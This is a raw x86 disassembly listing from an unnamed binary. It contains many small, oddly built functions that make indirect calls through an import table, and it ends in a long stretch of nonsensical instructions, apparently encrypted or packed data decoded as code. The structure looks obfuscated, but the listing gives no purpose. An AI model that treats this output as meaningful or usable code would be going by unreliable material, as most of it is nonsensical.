  4019a7:	push   DWORD PTR [edx+0x54c]
  4019ad:	call   0x401908
  4019b2:	add    esp,0x8
  4019b5:	pop    edx
  4019b6:	push   edx
  4019b7:	mov    ecx,0x0
  4019bc:	push   ecx
  4019bd:	push   0x403084
  4019c2:	pop    eax
  4019c3:	call   DWORD PTR cs:[eax]
  4019c6:	pop    edx
  4019c7:	push   edx
  4019c8:	mov    esi,0x0
  4019cd:	push   esi
  4019ce:	push   0x403014
  4019d3:	pop    eax
  4019d4:	call   DWORD PTR cs:[eax]
  4019d7:	pop    edx
  4019d8:	sub    esp,0xffffffcc
  4019db:	mov    ebp,DWORD PTR [esp]
  4019de:	add    esp,0x4
  4019e1:	ret    
  4019e2:	add    BYTE PTR [eax],al
  4019e4:	add    BYTE PTR [eax],al
  4019e6:	add    BYTE PTR [eax],al
  4019e8:	mov    edi,edi
  4019ea:	push   ebp
  4019eb:	mov    ebp,esp
  4019ed:	sub    esp,0x3c
  4019f0:	push   edx
  4019f1:	push   0x403034
  4019f6:	pop    eax
  4019f7:	call   DWORD PTR cs:[eax]
  4019fa:	pop    edx
  4019fb:	push   edx
  4019fc:	push   DWORD PTR [edx+0x388]
  401a02:	push   DWORD PTR [edx+0x4e4]
  401a08:	push   DWORD PTR [edx+0x110]
  401a0e:	push   ebx
  401a0f:	call   0x401abc
  401a14:	add    esp,0x10
  401a17:	pop    edx
  401a18:	push   edx
  401a19:	push   0x0
  401a1b:	push   0x40303c
  401a20:	pop    eax
  401a21:	call   DWORD PTR cs:[eax]
  401a24:	pop    edx
  401a25:	sub    esp,0xffffffc4
  401a28:	mov    ebp,DWORD PTR [esp]
  401a2b:	add    esp,0x4
  401a2e:	ret    
  401a2f:	add    BYTE PTR [ebx-0x1374aa01],cl
  401a35:	sub    esp,0x30
  401a38:	push   edx
  401a39:	push   edi
  401a3a:	push   ecx
  401a3b:	push   DWORD PTR [edx+0x68]
  401a3e:	push   DWORD PTR [edx+0x128]
  401a44:	call   0x401998
  401a49:	add    esp,0x10
  401a4c:	pop    edx
  401a4d:	push   edx
  401a4e:	push   0x0
  401a50:	push   0x403074
  401a55:	pop    eax
  401a56:	call   DWORD PTR cs:[eax]
  401a59:	pop    edx
  401a5a:	push   edx
  401a5b:	push   0x403034
  401a60:	pop    eax
  401a61:	call   DWORD PTR cs:[eax]
  401a64:	pop    edx
  401a65:	sub    esp,0xffffffd0
  401a68:	mov    ebp,DWORD PTR [esp]
  401a6b:	add    esp,0x4
  401a6e:	ret    
  401a6f:	add    BYTE PTR [ebx-0x1374aa01],cl
  401a75:	sub    esp,0x30
  401a78:	push   edx
  401a79:	push   DWORD PTR [edx+0x55c]
  401a7f:	push   DWORD PTR [edx+0x1dc]
  401a85:	push   esi
  401a86:	call   0x4015e0
  401a8b:	add    esp,0xc
  401a8e:	pop    edx
  401a8f:	push   edx
  401a90:	push   0x0
  401a92:	push   0x40305c
  401a97:	pop    eax
  401a98:	call   DWORD PTR cs:[eax]
  401a9b:	pop    edx
  401a9c:	push   edx
  401a9d:	mov    ebx,0x0
  401aa2:	push   ebx
  401aa3:	push   0x40301c
  401aa8:	pop    eax
  401aa9:	call   DWORD PTR cs:[eax]
  401aac:	pop    edx
  401aad:	sub    esp,0xffffffd0
  401ab0:	mov    ebp,DWORD PTR [esp]
  401ab3:	add    esp,0x4
  401ab6:	ret    
  401ab7:	add    BYTE PTR [eax],al
  401ab9:	add    BYTE PTR [eax],al
  401abb:	add    BYTE PTR [ebx-0x1374aa01],cl
  401ac1:	sub    esp,0x38
  401ac4:	push   edx
  401ac5:	push   0x0
  401ac7:	push   0x403084
  401acc:	pop    eax
  401acd:	call   DWORD PTR cs:[eax]
  401ad0:	pop    edx
  401ad1:	push   edx
  401ad2:	push   DWORD PTR [edx+0x5fc]
  401ad8:	push   DWORD PTR [edx+0x45c]
  401ade:	push   esi
  401adf:	call   0x401670
  401ae4:	add    esp,0xc
  401ae7:	pop    edx
  401ae8:	push   edx
  401ae9:	mov    esi,0x0
  401aee:	push   esi
  401aef:	push   0x403014
  401af4:	pop    eax
  401af5:	call   DWORD PTR cs:[eax]
  401af8:	pop    edx
  401af9:	sub    esp,0xffffffc8
  401afc:	mov    ebp,DWORD PTR [esp]
  401aff:	add    esp,0x4
  401b02:	ret    
	...
  401b0b:	add    BYTE PTR [ebx-0x1374aa01],cl
  401b11:	sub    esp,0x20
  401b14:	push   edx
  401b15:	push   0x0
  401b17:	push   0x403020
  401b1c:	pop    eax
  401b1d:	call   DWORD PTR cs:[eax]
  401b20:	pop    edx
  401b21:	push   edx
  401b22:	push   DWORD PTR [edx+0x5b4]
  401b28:	push   edi
  401b29:	push   DWORD PTR [edx+0x314]
  401b2f:	call   0x401e74
  401b34:	add    esp,0xc
  401b37:	pop    edx
  401b38:	push   edx
  401b39:	mov    esi,0x0
  401b3e:	push   esi
  401b3f:	push   0x403020
  401b44:	pop    eax
  401b45:	call   DWORD PTR cs:[eax]
  401b48:	pop    edx
  401b49:	sub    esp,0xffffffe0
  401b4c:	mov    ebp,DWORD PTR [esp]
  401b4f:	add    esp,0x4
  401b52:	ret    
  401b53:	add    BYTE PTR [ebx-0x1374aa01],cl
  401b59:	sub    esp,0x24
  401b5c:	push   edx
  401b5d:	mov    edx,0x0
  401b62:	push   edx
  401b63:	push   0x40301c
  401b68:	pop    eax
  401b69:	call   DWORD PTR cs:[eax]
  401b6c:	pop    edx
  401b6d:	push   edx
  401b6e:	push   ecx
  401b6f:	push   esi
  401b70:	push   DWORD PTR [edx+0x1dc]
  401b76:	push   DWORD PTR [edx+0x3d4]
  401b7c:	call   0x401cd0
  401b81:	add    esp,0x10
  401b84:	pop    edx
  401b85:	push   edx
  401b86:	mov    eax,0x0
  401b8b:	push   eax
  401b8c:	push   0x40300c
  401b91:	pop    eax
  401b92:	call   DWORD PTR cs:[eax]
  401b95:	pop    edx
  401b96:	sub    esp,0xffffffdc
  401b99:	mov    ebp,DWORD PTR [esp]
  401b9c:	add    esp,0x4
  401b9f:	ret    
  401ba0:	mov    edi,edi
  401ba2:	push   ebp
  401ba3:	mov    ebp,esp
  401ba5:	sub    esp,0x4c
  401ba8:	push   edx
  401ba9:	push   edi
  401baa:	push   ebx
  401bab:	push   DWORD PTR [edx+0x430]
  401bb1:	push   esi
  401bb2:	call   0x401878
  401bb7:	add    esp,0x10
  401bba:	pop    edx
  401bbb:	push   edx
  401bbc:	lea    ebx,[edx]
  401bbe:	push   ebx
  401bbf:	push   0x403010
  401bc4:	pop    eax
  401bc5:	call   DWORD PTR cs:[eax]
  401bc8:	test   eax,eax
  401bca:	jne    0x401bbc
  401bcc:	pop    edx
  401bcd:	push   edx
  401bce:	mov    ecx,0x0
  401bd3:	push   ecx
  401bd4:	push   0x403020
  401bd9:	pop    eax
  401bda:	call   DWORD PTR cs:[eax]
  401bdd:	pop    edx
  401bde:	sub    esp,0xffffffb4
  401be1:	mov    ebp,DWORD PTR [esp]
  401be4:	add    esp,0x4
  401be7:	ret    
	...
  401bf0:	mov    edi,edi
  401bf2:	push   ebp
  401bf3:	mov    ebp,esp
  401bf5:	sub    esp,0x34
  401bf8:	push   edx
  401bf9:	push   DWORD PTR [edx+0x5e8]
  401bff:	push   DWORD PTR [edx+0xd0]
  401c05:	push   esi
  401c06:	push   DWORD PTR [edx+0x68]
  401c09:	call   0x401b54
  401c0e:	add    esp,0x10
  401c11:	pop    edx
  401c12:	push   edx
  401c13:	mov    eax,0x0
  401c18:	push   eax
  401c19:	push   0x40303c
  401c1e:	pop    eax
  401c1f:	call   DWORD PTR cs:[eax]
  401c22:	pop    edx
  401c23:	push   edx
  401c24:	mov    edi,0x0
  401c29:	push   edi
  401c2a:	push   0x40301c
  401c2f:	pop    eax
  401c30:	call   DWORD PTR cs:[eax]
  401c33:	pop    edx
  401c34:	sub    esp,0xffffffcc
  401c37:	mov    ebp,DWORD PTR [esp]
  401c3a:	add    esp,0x4
  401c3d:	ret    
  401c3e:	add    BYTE PTR [eax],al
  401c40:	mov    edi,edi
  401c42:	push   ebp
  401c43:	mov    ebp,esp
  401c45:	sub    esp,0x58
  401c48:	push   edx
  401c49:	push   ecx
  401c4a:	push   DWORD PTR [edx+0x458]
  401c50:	push   DWORD PTR [edx+0x250]
  401c56:	call   0x401b0c
  401c5b:	add    esp,0xc
  401c5e:	pop    edx
  401c5f:	push   edx
  401c60:	mov    esi,0x0
  401c65:	push   esi
  401c66:	push   0x403014
  401c6b:	pop    eax
  401c6c:	call   DWORD PTR cs:[eax]
  401c6f:	pop    edx
  401c70:	push   edx
  401c71:	mov    ecx,0x0
  401c76:	push   ecx
  401c77:	push   0x40302c
  401c7c:	pop    eax
  401c7d:	call   DWORD PTR cs:[eax]
  401c80:	pop    edx
  401c81:	sub    esp,0xffffffa8
  401c84:	mov    ebp,DWORD PTR [esp]
  401c87:	add    esp,0x4
  401c8a:	ret    
  401c8b:	add    BYTE PTR [ebx-0x1374aa01],cl
  401c91:	sub    esp,0x20
  401c94:	push   edx
  401c95:	push   ebx
  401c96:	push   DWORD PTR [edx+0x1f0]
  401c9c:	push   eax
  401c9d:	call   0x4014b0
  401ca2:	add    esp,0xc
  401ca5:	pop    edx
  401ca6:	push   edx
  401ca7:	mov    ecx,0x0
  401cac:	push   ecx
  401cad:	push   0x403020
  401cb2:	pop    eax
  401cb3:	call   DWORD PTR cs:[eax]
  401cb6:	pop    edx
  401cb7:	push   edx
  401cb8:	push   0x403034
  401cbd:	pop    eax
  401cbe:	call   DWORD PTR cs:[eax]
  401cc1:	pop    edx
  401cc2:	sub    esp,0xffffffe0
  401cc5:	mov    ebp,DWORD PTR [esp]
  401cc8:	add    esp,0x4
  401ccb:	ret    
  401ccc:	add    BYTE PTR [eax],al
  401cce:	add    BYTE PTR [eax],al
  401cd0:	mov    edi,edi
  401cd2:	push   ebp
  401cd3:	mov    ebp,esp
  401cd5:	sub    esp,0x5c
  401cd8:	push   edx
  401cd9:	push   0x0
  401cdb:	push   0x403008
  401ce0:	pop    eax
  401ce1:	call   DWORD PTR cs:[eax]
  401ce4:	pop    edx
  401ce5:	push   edx
  401ce6:	push   eax
  401ce7:	push   ebx
  401ce8:	call   0x4012c4
  401ced:	add    esp,0x8
  401cf0:	pop    edx
  401cf1:	push   edx
  401cf2:	mov    ecx,0x0
  401cf7:	push   ecx
  401cf8:	push   0x40304c
  401cfd:	pop    eax
  401cfe:	call   DWORD PTR cs:[eax]
  401d01:	pop    edx
  401d02:	sub    esp,0xffffffa4
  401d05:	mov    ebp,DWORD PTR [esp]
  401d08:	add    esp,0x4
  401d0b:	ret    
	...
  401d14:	mov    edi,edi
  401d16:	push   ebp
  401d17:	mov    ebp,esp
  401d19:	sub    esp,0x30
  401d1c:	push   edx
  401d1d:	push   DWORD PTR [edx+0x4bc]
  401d23:	push   ecx
  401d24:	push   esi
  401d25:	call   0x401598
  401d2a:	add    esp,0xc
  401d2d:	pop    edx
  401d2e:	push   edx
  401d2f:	lea    eax,[edx]
  401d31:	push   eax
  401d32:	push   0x403010
  401d37:	pop    eax
  401d38:	call   DWORD PTR cs:[eax]
  401d3b:	test   eax,eax
  401d3d:	jne    0x401d2f
  401d3f:	pop    edx
  401d40:	push   edx
  401d41:	mov    esi,0x0
  401d46:	push   esi
  401d47:	push   0x40304c
  401d4c:	pop    eax
  401d4d:	call   DWORD PTR cs:[eax]
  401d50:	pop    edx
  401d51:	sub    esp,0xffffffd0
  401d54:	mov    ebp,DWORD PTR [esp]
  401d57:	add    esp,0x4
  401d5a:	ret    
  401d5b:	add    BYTE PTR [ebx-0x1374aa01],cl
  401d61:	sub    esp,0x20
  401d64:	push   edx
  401d65:	mov    ebx,0x0
  401d6a:	push   ebx
  401d6b:	push   0x403020
  401d70:	pop    eax
  401d71:	call   DWORD PTR cs:[eax]
  401d74:	pop    edx
  401d75:	push   edx
  401d76:	push   DWORD PTR [edx+0x470]
  401d7c:	push   ebx
  401d7d:	push   esi
  401d7e:	call   0x401c8c
  401d83:	add    esp,0xc
  401d86:	pop    edx
  401d87:	push   edx
  401d88:	mov    edx,0x0
  401d8d:	push   edx
  401d8e:	push   0x40300c
  401d93:	pop    eax
  401d94:	call   DWORD PTR cs:[eax]
  401d97:	pop    edx
  401d98:	sub    esp,0xffffffe0
  401d9b:	mov    ebp,DWORD PTR [esp]
  401d9e:	add    esp,0x4
  401da1:	ret    
  401da2:	add    BYTE PTR [eax],al
  401da4:	mov    edi,edi
  401da6:	push   ebp
  401da7:	mov    ebp,esp
  401da9:	sub    esp,0x50
  401dac:	push   edx
  401dad:	push   ecx
  401dae:	push   eax
  401daf:	push   edi
  401db0:	push   edi
  401db1:	call   0x401154
  401db6:	add    esp,0x10
  401db9:	pop    edx
  401dba:	push   edx
  401dbb:	push   0x0
  401dbd:	push   0x40301c
  401dc2:	pop    eax
  401dc3:	call   DWORD PTR cs:[eax]
  401dc6:	pop    edx
  401dc7:	push   edx
  401dc8:	lea    esi,[edx]
  401dca:	push   esi
  401dcb:	push   0x403010
  401dd0:	pop    eax
  401dd1:	call   DWORD PTR cs:[eax]
  401dd4:	test   eax,eax
  401dd6:	jne    0x401dc8
  401dd8:	pop    edx
  401dd9:	sub    esp,0xffffffb0
  401ddc:	mov    ebp,DWORD PTR [esp]
  401ddf:	add    esp,0x4
  401de2:	ret    
  401de3:	add    BYTE PTR [ebx-0x1374aa01],cl
  401de9:	sub    esp,0x24
  401dec:	push   edx
  401ded:	push   edi
  401dee:	push   DWORD PTR [edx+0x454]
  401df4:	push   DWORD PTR [edx+0xe0]
  401dfa:	call   0x4019e8
  401dff:	add    esp,0xc
  401e02:	pop    edx
  401e03:	push   edx
  401e04:	push   0x403004
  401e09:	pop    eax
  401e0a:	call   DWORD PTR cs:[eax]
  401e0d:	pop    edx
  401e0e:	push   edx
  401e0f:	push   0x403034
  401e14:	pop    eax
  401e15:	call   DWORD PTR cs:[eax]
  401e18:	pop    edx
  401e19:	sub    esp,0xffffffdc
  401e1c:	mov    ebp,DWORD PTR [esp]
  401e1f:	add    esp,0x4
  401e22:	ret    
  401e23:	add    BYTE PTR [eax],al
  401e25:	add    BYTE PTR [eax],al
  401e27:	add    BYTE PTR [ebx-0x1374aa01],cl
  401e2d:	sub    esp,0x34
  401e30:	push   edx
  401e31:	push   DWORD PTR [edx+0x38]
  401e34:	push   DWORD PTR [edx+0x14c]
  401e3a:	push   DWORD PTR [edx+0x438]
  401e40:	push   edi
  401e41:	call   0x40146c
  401e46:	add    esp,0x10
  401e49:	pop    edx
  401e4a:	push   edx
  401e4b:	push   0x0
  401e4d:	push   0x403084
  401e52:	pop    eax
  401e53:	call   DWORD PTR cs:[eax]
  401e56:	pop    edx
  401e57:	push   edx
  401e58:	lea    edi,[edx]
  401e5a:	push   edi
  401e5b:	push   0x403010
  401e60:	pop    eax
  401e61:	call   DWORD PTR cs:[eax]
  401e64:	test   eax,eax
  401e66:	jne    0x401e58
  401e68:	pop    edx
  401e69:	sub    esp,0xffffffcc
  401e6c:	mov    ebp,DWORD PTR [esp]
  401e6f:	add    esp,0x4
  401e72:	ret    
  401e73:	add    BYTE PTR [ebx-0x1374aa01],cl
  401e79:	sub    esp,0x34
  401e7c:	push   edx
  401e7d:	push   0x403034
  401e82:	pop    eax
  401e83:	call   DWORD PTR cs:[eax]
  401e86:	pop    edx
  401e87:	push   edx
  401e88:	push   eax
  401e89:	push   DWORD PTR [edx+0x57c]
  401e8f:	push   ecx
  401e90:	call   0x401000
  401e95:	add    esp,0xc
  401e98:	pop    edx
  401e99:	push   edx
  401e9a:	push   0x0
  401e9c:	push   0x403074
  401ea1:	pop    eax
  401ea2:	call   DWORD PTR cs:[eax]
  401ea5:	pop    edx
  401ea6:	sub    esp,0xffffffcc
  401ea9:	mov    ebp,DWORD PTR [esp]
  401eac:	add    esp,0x4
  401eaf:	ret    
  401eb0:	fwait
  401eb1:	dec    ch
  401eb3:	cmc    
  401eb4:	mov    eax,ds:0xba11be07
  401eb9:	sub    al,BYTE PTR ds:0x500d902e
  401ebf:	fnsave [edx]
  401ec1:	ficomp WORD PTR [edx-0x535cfea7]
  401ec7:	or     al,0xe2
  401ec9:	bswap  eax
  401ecb:	std    
  401ecc:	out    dx,eax
  401ecd:	sahf   
  401ece:	mov    ecx,0xc7c70097
  401ed3:	add    DWORD PTR [eax],eax
  401ed5:	mov    edi,0xc6e30001
  401edb:	jg     0x401f1e
  401edd:	retf   0xa27e
  401ee0:	mov    ebp,0x310580a8
  401ee5:	imul   esi,eax,0xffffffe2
  401ee8:	add    DWORD PTR ds:0x251691a3,ecx
  401eee:	gs ins BYTE PTR es:[edi],dx
  401ef0:	pop    eax
  401ef1:	push   edi
  401ef2:	inc    eax
  401ef3:	push   ss
  401ef4:	or     DWORD PTR [edx+0x32],eax
  401ef7:	imul   ecx,DWORD PTR [ecx],0xffffffff
  401efa:	mov    edx,0xbcd552e7
  401eff:	ins    BYTE PTR es:[edi],dx
  401f00:	mov    esi,0x81d8533b
  401f05:	push   esp
  401f06:	js     0x401eff
  401f08:	pop    edx
  401f09:	call   0xf444a4fe
  401f0e:	mov    ch,0xa0
  401f10:	jge    0x401ef6
  401f12:	adc    BYTE PTR [eax],al
  401f14:	add    DWORD PTR [eax],edx
  401f16:	adc    al,0x1d
  401f18:	sbb    ebp,DWORD PTR [edi+0x468a0000]
  401f1e:	(bad)  
  401f1f:	adc    BYTE PTR [esi+edx*4],dl
  401f22:	and    eax,0x60f2ae1
  401f27:	call   0x3110:0x20092406
  401f2e:	sbb    edx,DWORD PTR [edi+0x76dd5ba9]
  401f34:	ins    DWORD PTR es:[edi],dx
  401f35:	mov    DWORD PTR [eax+0x13],esp
  401f38:	xor    eax,0x2102650d
  401f3d:	add    BYTE PTR [edx+eax*1],al
  401f40:	and    eax,0x5c1d9a32
  401f45:	jbe    0x401f5c
  401f47:	push   eax
  401f48:	add    BYTE PTR [edx+0x702b6291],0xc4
  401f4f:	xchg   ebx,eax
  401f50:	adc    DWORD PTR [eax],eax
  401f52:	add    al,ah
  401f54:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  401f55:	push   0xff6b6a00
  401f5a:	push   ebp
  401f5b:	push   ss
  401f5c:	pushf  
  401f5d:	lods   eax,DWORD PTR ds:[esi]
  401f5e:	cli    
  401f5f:	cdq    
  401f60:	cwde   
  401f61:	add    eax,0xb5dedbf8
  401f66:	aam    0xf9
  401f68:	stc    
  401f69:	aam    0xf
  401f6b:	sub    eax,0xcffb9a7
  401f70:	push   esi
  401f71:	ret    
  401f72:	call   0xc428ad04
  401f77:	stc    
  401f78:	add    al,BYTE PTR [edi-0x238cdecc]
  401f7e:	jl     0x401fda
  401f80:	add    eax,0x3f6f00fb
  401f85:	call   0x6ab2aa8a
  401f8a:	add    BYTE PTR [edi+0x6b],ch
  401f8d:	call   FWORD PTR [edi]
  401f8f:	pushf  
  401f90:	cmp    al,0x8a
  401f92:	stos   BYTE PTR es:[edi],al
  401f93:	sub    BYTE PTR [eax+ebx*1+0x3c6b3d97],ah
  401f9a:	adc    eax,0x47cca74
  401f9f:	push   ecx
  401fa0:	push   es
  401fa1:	pop    es
  401fa2:	(bad)  [ecx+0x78]
  401fa5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  401fa6:	add    BYTE PTR [ecx-0x364fb057],ch
  401fac:	loope  0x401f96
  401fae:	sbb    dh,bl
  401fb0:	int3   
  401fb1:	cmp    al,0x8d
  401fb3:	pop    es
  401fb4:	add    ebp,ebx
  401fb6:	retf   
  401fb7:	push   es
  401fb8:	push   edi
  401fb9:	test   DWORD PTR [esi+0x73],0x22581962
  401fc0:	inc    ecx
  401fc1:	dec    ecx
  401fc2:	mov    dl,0x4e
  401fc4:	ins    DWORD PTR es:[edi],dx
  401fc5:	loope  0x401fdc
  401fc7:	sbb    al,0x69
  401fc9:	xor    al,0x6a
  401fcb:	xor    al,0x0
  401fcd:	jno    0x40202f
  401fcf:	push   ebx
  401fd0:	push   ebx
  401fd1:	push   es
  401fd2:	pusha  
  401fd3:	je     0x401fca
  401fd5:	jl     0x401fdc
  401fd7:	stos   DWORD PTR es:[edi],eax
  401fd8:	aas    
  401fd9:	push   esp
  401fda:	cmp    ebp,DWORD PTR [esi]
  401fdc:	push   ebx
  401fdd:	add    DWORD PTR [eax],ecx
  401fdf:	ds aas 
  401fe1:	push   cs
  401fe2:	add    ch,BYTE PTR [esp+eax*1+0x77e1cddc]
  401fe9:	cmp    al,0x2f
  401feb:	or     BYTE PTR [esi-0xe],bl
  401fee:	jmp    DWORD PTR [ebx-0x49a93d2c]
  401ff4:	je     0x401f84
  401ff6:	mov    bh,0x93
  401ff8:	xchg   esp,eax
  401ff9:	lods   eax,DWORD PTR cs:[esi]
  401ffb:	xor    esi,DWORD PTR [edi-0x577bc9f]
  402001:	sbb    esi,esi
  402003:	dec    BYTE PTR [esi-0x29]
  402006:	test   BYTE PTR [edi+0x72a00e52],bh
  40200c:	ss dec ebx
  40200e:	ret    0x8e1c
  402011:	xchg   edi,edi
  402013:	jnp    0x401fe8
  402015:	out    0xc4,eax
  402017:	test   DWORD PTR [ecx],eax
  402019:	(bad)  
  40201a:	pop    ebx
  40201b:	arpl   bx,ax
  40201d:	in     al,dx
  40201e:	arpl   WORD PTR [ebp+0x76],si
  402021:	call   0x14bb644a
  402026:	push   DWORD PTR [ebp+0x66]
  402029:	je     0x402096
  40202b:	jnp    0x402035
  40202d:	test   al,dl
  40202f:	inc    eax
  402030:	fmul   QWORD PTR [edi+0x50253a9]
  402036:	test   ecx,ebx
  402038:	cmp    DWORD PTR [ebp+0x6],edx
  40203b:	push   es
  40203c:	push   edi
  40203d:	pop    es
  40203e:	or     BYTE PTR [ebx],dh
  402040:	ins    DWORD PTR es:[edi],dx
  402041:	int3   
  402042:	add    cl,BYTE PTR [eax+ebx*2]
  402045:	or     BYTE PTR [ebx-0x8],cl
  402048:	aas    
  402049:	das    
  40204a:	mov    al,ds:0xc5a758ff
  40204f:	jo     0x40209c
  402051:	dec    ecx
  402052:	mov    edx,0x29e958bd
  402057:	mov    DWORD PTR [ecx],0x1e88ae9
  40205d:	xor    DWORD PTR [eax+0x186968],0x28760000
  402067:	push   esi
  402068:	ficom  DWORD PTR [ebx-0x78e6f002]
  40206e:	dec    DWORD PTR [ebx-0x220c9fff]
  402074:	add    al,0xff
  402076:	add    BYTE PTR fs:[ecx-0x75],bl
  40207a:	inc    eax
  40207b:	cmp    al,0x80
  40207d:	add    BYTE PTR [edi+0x34146061],al
  402083:	(bad)
  402087:	scas   eax,DWORD PTR es:[edi]
  402088:	jnp    0x402071
  40208a:	and    al,0x88
  40208c:	dec    ecx
  40208d:	sbb    BYTE PTR [edi-0x3477a706],al
  402093:	shl    al,0xef
  402096:	mov    bl,BYTE PTR [eax+0x6d]
  402099:	out    dx,eax
  40209a:	out    dx,eax
  40209b:	cmp    DWORD PTR [esi-0x9],edx
  40209e:	inc    esi
  40209f:	imul   edi,DWORD PTR [eax+0x44],0xa1190ea1
  4020a6:	fs xchg edx,ecx
  4020a9:	xor    BYTE PTR [ecx+0x65767178],cl
  4020af:	push   esp
  4020b0:	std    
  4020b1:	jbe    0x4020b0
  4020b3:	or     BYTE PTR [ecx],al
  4020b5:	pop    edi
  4020b6:	jmp    0x7e1c:0x79bdd2b0
  4020bd:	je     0x40205b
  4020bf:	mov    dh,0x3a
  4020c1:	call   0x791a5a16
  4020c6:	pop    eax
  4020c7:	add    al,0x3
  4020c9:	pop    eax
  4020ca:	js     0x4020c0
  4020cc:	mov    eax,DWORD PTR gs:[esi+eiz*1]
  4020d0:	in     al,dx
  4020d1:	add    BYTE PTR [edi+0x424010f],ch
  4020d7:	cmp    BYTE PTR [edx+0x64500424],cl
  4020dd:	(bad)  
  4020de:	out    0x14,eax
  4020e0:	in     al,dx
  4020e1:	xor    bl,al
  4020e3:	inc    ebp
  4020e4:	dec    ebx
  4020e5:	mov    BYTE PTR [ebp+0xb],al
  4020e8:	xor    DWORD PTR [esi+0x7472b98b],0xf8f70373
  4020f2:	or     bh,dl
  4020f4:	mov    al,BYTE PTR [ecx-0x70916601]
  4020fa:	test   al,0x7a
  4020fc:	test   eax,0xb6c37e53
  402101:	adc    DWORD PTR [ebx-0x56],0x235457a9
  402108:	fisub  DWORD PTR [esi]
  40210a:	adc    BYTE PTR [esi-0x9],dl
  40210d:	fwait
  40210e:	mov    BYTE PTR [esi],ah
  402110:	sub    edi,DWORD PTR [esi]
  402112:	dec    BYTE PTR [eax]
  402114:	xlat   BYTE PTR ds:[ebx]
  402115:	or     BYTE PTR [ebx+0x4b],0x91
  402119:	fisub  DWORD PTR [edi+0x543f7f]
  40211f:	or     DWORD PTR [edi+0x7],edx
  402122:	or     BYTE PTR [edx+ebx*8],bh
  402125:	or     dl,al
  402127:	aas    
  402128:	push   ecx
  402129:	adc    eax,0x657cd8d
  40212e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40212f:	xchg   ebx,eax
  402130:	pop    ebx
  402131:	cdq    
  402132:	or     al,dl
  402134:	mov    ch,0x9e
  402136:	add    al,0x57
  402138:	add    DWORD PTR [ecx+0xd70019b],ebp
  40213e:	inc    esp
  40213f:	add    eax,DWORD PTR [eax]
  402141:	popa   
  402142:	jb     0x40213f
  402144:	(bad)  
  402145:	jg     0x4021bc
  402147:	std    
  402148:	mov    dh,BYTE PTR [ebx+ebp*2+0x0]
  40214c:	test   eax,0xa9f8f1c
  402151:	hlt    
  402152:	push   esi
  402153:	or     eax,0xb10f0a02
  402158:	or     DWORD PTR [edi-0x29aaaaff],ebp
  40215e:	cmp    DWORD PTR [ebx-0x8],eax
  402161:	dec    ecx
  402162:	loop   0x4020ff
  402164:	mov    ds:0x78605cea,al
  402169:	sar    ch,1
  40216b:	pop    esp
  40216c:	adc    BYTE PTR [eax],ah
  40216e:	aaa    
  40216f:	ja     0x4021c7
  402171:	cmp    edx,edx
  402173:	mov    esi,0x590f8494
  402178:	add    al,0xa4
  40217a:	add    BYTE PTR [eax],al
  40217c:	add    DWORD PTR [ebx-0x495ed1ee],ecx
  402182:	mov    eax,DWORD PTR [ebp-0x7e7bf08e]
  402188:	add    BYTE PTR [edi+ecx*1-0x7452080b],0xf8
  402190:	cld    
  402191:	jo     0x402190
  402193:	js     0x4021e3
  402195:	add    BYTE PTR [edx+0x543b0351],ch
  40219b:	lods   al,BYTE PTR ds:[esi]
  40219c:	imul   edx,DWORD PTR [edx+ebp*2],0xf8835850
  4021a3:	add    al,0x55
  4021a5:	add    BYTE PTR [edi+0x6a14693f],0x50
  4021ac:	pop    eax
  4021ad:	adc    DWORD PTR [esp],0x57811425
  4021b4:	add    BYTE PTR [esi+0x1c],dl
  4021b7:	jmp    FWORD PTR [ecx-0x859f100]
  4021bd:	jno    0x402183
  4021bf:	add    al,0xdd
  4021c1:	add    dl,bh
  4021c3:	inc    esp
  4021c4:	ins    DWORD PTR es:[edi],dx
  4021c5:	cmp    ah,cl
  4021c7:	mov    eax,0xe54462f2
  4021cc:	int3   
  4021cd:	lods   eax,DWORD PTR ds:[esi]
  4021ce:	push   esi
  4021cf:	mov    ah,0x7d
  4021d1:	adc    eax,0xff0ea6ff
  4021d6:	and    al,0x1c
  4021d8:	sbb    al,0xe3
  4021da:	out    dx,al
  4021db:	pop    ecx
  4021dc:	xlat   BYTE PTR ds:[ebx]
  4021dd:	stos   BYTE PTR es:[edi],al
  4021de:	mov    BYTE PTR [ebx],0x56
  4021e1:	jbe    0x4021f7
  4021e3:	jb     0x4021b3
  4021e5:	cmp    BYTE PTR [edx+0x41],dl
  4021e8:	adc    DWORD PTR [eax],eax
  4021ea:	aas    
  4021eb:	mov    bl,0x6a
  4021ed:	push   ebx
  4021ee:	push   eax
  4021ef:	dec    esi
  4021f1:	cmp    BYTE PTR [eax+edi*8],al
  4021f4:	adc    DWORD PTR [eax],eax
  4021f6:	aas    
  4021f7:	mov    cl,0x84
  4021f9:	jae    0x4021fb
  4021fb:	adc    BYTE PTR [ecx],dl
  4021fd:	add    bl,bl
  4021ff:	push   ecx
  402200:	pop    eax
  402201:	add    BYTE PTR [ebp+0xc],dl
  402204:	push   edi
  402205:	or     al,0xa7
  402207:	push   esp
  402208:	ficom  WORD PTR [ecx-0x491c24d4]
  40220e:	test   eax,0x21cde36e
  402213:	pushf  
  402214:	jae    0x4021ec
  402216:	scas   al,BYTE PTR es:[edi]
  402217:	les    ecx,FWORD PTR [edi-0x15]
  40221a:	mov    edi,0xe89b497e
  40221f:	mov    eax,DWORD PTR [ecx]
  402221:	call   0xec3f6921
  402226:	push   edx
  402227:	pop    ds
  402228:	push   ds
  402229:	mov    ecx,0xff0a17ff
  40222e:	(bad)  
  40222f:	jmp    FWORD PTR [eax+0x1e1f846]
  402235:	pop    es
  402236:	push   ecx
  402237:	adc    dh,0xe8
  40223a:	add    BYTE PTR [edx+ebx*2-0x6124348c],cl
  402241:	cmp    eax,0xe801d08b
  402246:	into   
  402247:	inc    esi
  402248:	inc    edi
  40224a:	fs (bad) 
  40224c:	jb     0x40228f
  40224e:	pop    ss
  40224f:	inc    ecx
  402250:	mov    esi,0xf2bfcae8
  402255:	scas   eax,DWORD PTR es:[edi]
  402256:	ds aaa 
  402258:	rol    BYTE PTR [eax],0x54
  40225b:	in     al,0x2a
  40225d:	add    eax,0x808923c5
  402262:	sar    DWORD PTR [eax-0x79],0x98
  402266:	cvtdq2ps xmm1,xmm3
  402269:	dec    esi
  40226a:	sub    al,0xf2
  40226c:	dec    eax
  40226d:	add    DWORD PTR [eax],ebx
  40226f:	mov    al,0xbe
  402271:	stc    
  402272:	int3   
  402273:	inc    eax
